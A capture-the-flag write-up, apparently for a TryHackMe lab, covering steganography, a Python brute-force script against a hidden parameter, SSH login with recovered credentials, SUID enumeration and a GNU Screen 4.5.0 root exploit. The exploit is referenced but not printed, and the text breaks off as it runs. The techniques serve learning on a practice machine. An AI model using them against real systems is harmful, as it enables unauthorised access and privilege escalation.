- While I was waiting for scanners to finish, I explored the web app. In source code, there is a secret message in regards to a image which I downloaded to my Kali.

  ```
  <img src="thm.jpg" class="floating_element"/>
  <!-- They will never find me-->

  wget http://10.10.131.131/thm.jpg
  ```
  
- Alrighty, when I opened that picture nothing was there, I used steghide on it but it needed passphrase, when I checked the header I realise that is messed up. Use `hexedit` and change first 12 bytes to this `FF D8 FF E0  00 10 4A 46  49 46 00 01`, save it and check the image again.
  Now you have a hidden directory!

  ```
  head thm.jpg                   
  ÔøΩPNG
  ‚ñí
  ÔøΩÔøΩC
   
  
  
  
  
  
  
  
  
  
  
  ‚ñí‚ñíÔøΩÔøΩC
  ÔøΩÔøΩÔøΩÔøΩÔøΩ
  
  ÔøΩÔøΩÔøΩ}!1AQa"q2ÔøΩÔøΩ#BÔøΩÔøΩRÔøΩÔøΩ$3brÔøΩ

  hexedit thm.jpg

  
  hidden directory
  /th1s_1s_h1dd3n
  ```

- After visiting `http://10.10.131.131/th1s_1s_h1dd3n/`, message from the author is shown. In the source code there's a clue on how to find the secret message!

  ```
  Welcome! I have been expecting you!

  To obtain my identity you need to guess my secret!
  
  Secret Entered:
  
  That is wrong! Get outta here!

  <h2>Welcome! I have been expecting you!</h2>
  <p>To obtain my identity you need to guess my secret! </p>
  <!-- It's between 0-99 but I don't think anyone will look here-->
  
  <p>Secret Entered: </p>
  
  <p>That is wrong! Get outta here!</p>
  ```

- OK, nice, the hidden parameter here is `secret` which is reflected in URL `http://10.10.131.131/th1s_1s_h1dd3n/?secret=`, we will have to brute force our way in, let's do it!

---

## ‚öôÔ∏è Brute Force, Steganography and Shell Access

- So when it comes to brute forcing, there's few ways you can go around. Use Burp, make custom scripts, find tools or if you want to get consumed by madness do it manually.
  I wrote a sscript in Python since it is much faster than running Burp, but I also run Burp after it just to confirm if I got right result with my script. Script was 10230201x faster than Burp!

  ```
  nano brute.py

  import requests

  def main():
  	base_url = "http://10.10.131.131/th1s_1s_h1dd3n/?secret="
  
  	for i in range(100):
  		url = base_url + str(i)
  		response = requests.get(url)
  			
  		if "That is wrong! Get outta here!" not in response.text:
  			print(f"Found valid response with {i}")
  			print(response.text)
  			break
  					
  main()
  ```

  ```
  python3 brute.py 
  Found valid response with 73
  <html>
  <head>
    <title>Hidden Directory</title>
    <link href="stylesheet.css" rel="stylesheet" type="text/css">
  </head>
  <body>
    <div class="main">
  <h2>Welcome! I have been expecting you!</h2>
  <p>To obtain my identity you need to guess my secret! </p>
  <!-- It's between 0-99 but I don't think anyone will look here-->
  
  <p>Secret Entered: 73</p>
  
  <p>Urgh, you got it right! But I won't tell you who I am! y2RPJ4QaPF!B</p>
  
  </div>
  </body>
  </html>
  ```

  In Burp, simply intercept the request, send it to repeater, select the number value as payload and change payload type to `Numbers` in range from 0 to 99. When attack finishes, look for difference in length and you'll find the secret message in respose.

  ```

  ```
  
- Perfect, we have password now, or that's what I thought... Here it took me a while to get to the next part since I was trying to decode this string but couldn't do it for a long time.
  At one point, I was going through my previous steps and saw that I've put a note `steghide didn't work on thm.jpg cuz no passphrase` so then I tried it again with newly found string and guess what, it worked!

  ```
  steghide --extract -sf thm.jpg 
  Enter passphrase: 
  wrote extracted data to "hidden.txt".
  
  cat hidden.txt     
  Fine you found the password! 
  
  Here's a username 
  
  wbxre
  
  I didn't say I would make it easy for you!
  ```
  
- Now we have username as well, but... When I used it to login with SSH, it was unsuccessfull. What made my job easier is the hint for first flag `There's something ROTten about this guys name!` which means we have to decode this ROT cipher.

  ```
  echo "wbxre" | tr 'A-Za-z' 'N-ZA-Mn-za-m' 
  joker
  ```

- Let's try again to login with SSH. Nope, doesn't work... We need legit password now since ths string `y2RPJ4QaPF!B` that we have is just a passphrase and not a password at all.

- Hear me out, this is the part where you'll lose your mind and get conusmed by madness like me. I literally tried everything I know, crypto, steghide, binwalk, hexediting again, trying web exploitaiton, etc.
  Trust me, it took me more than an hour to get this one, and it's so simple lol... There's another image in this challenge that contains hidden message, I know that you know it!

  <img src="https://github.com/mauzware/Mauzalyzer-assets/blob/main/madness%20image.jpeg"/>

- So when I downloaded image and ran it through steghide and it revealed the actual password. No passphrase needed for steghide. Now I'm officialy mad right?

  ```
  steghide --extract -sf madness.jpeg                                                   
  Enter passphrase: 
  wrote extracted data to "password.txt".
  
  cat password.txt 
  I didn't think you'd find me! Congratulations!
  
  Here take my password
  
  *axA&GF8dP
  ```

- At this point, I was just hoping that this is and actual password and not another encoded string... I tried SSH, and it worked!

  ```
  ssh joker@10.10.131.131
  joker@10.10.131.131's password:

- LEGOOOOOOOOOOOOOO, madness defeated, kinda! Flags are next part of the job.

---

## üßç User Privilege Escalation

- OK, you can take a breather now, user flag is easy-peasy.

  ```
  joker@ubuntu:~$ ls
  user.txt
  
  joker@ubuntu:~$ cat user.txt 
  THM{d5781e53b130efe2f94f9b0354a5e4ea}
  ```
  
- Moving to escalation for final flag.

---

## üëë Root Privilege Escalation

- OK, this one was different than usual. When my `sudo -l` got denied, `cronjobs` were empty and `getcap` showed literally nothing, I almost started crying lol... jk. This is what got me to root after a bit of enumeration.

  ```
  find / -type f -user root -perm -4000 -exec ls -ldb {} \; 2>>/dev/null

- These are the files that we have permission to execute. Out all of these, `/screen` is the only unusual one that I haven't seen yet nor exploited. I found the exploit on GTFOBins, but when I tried it it was unsuccessfull.
  So, I did googled screen 4.5.0 exploit and found the correct one! [This one](https://www.exploit-db.com/exploits/41154) is pretty simple: on target machine create new file, copy/paste the code, change the file to executable and run it. Let's do it.

  ```
  joker@ubuntu:~$ nano screen-exploit.sh
  joker@ubuntu:~$ chmod +x screen-exploit.sh 
  joker@ubuntu:~$ ./screen-exploit.sh
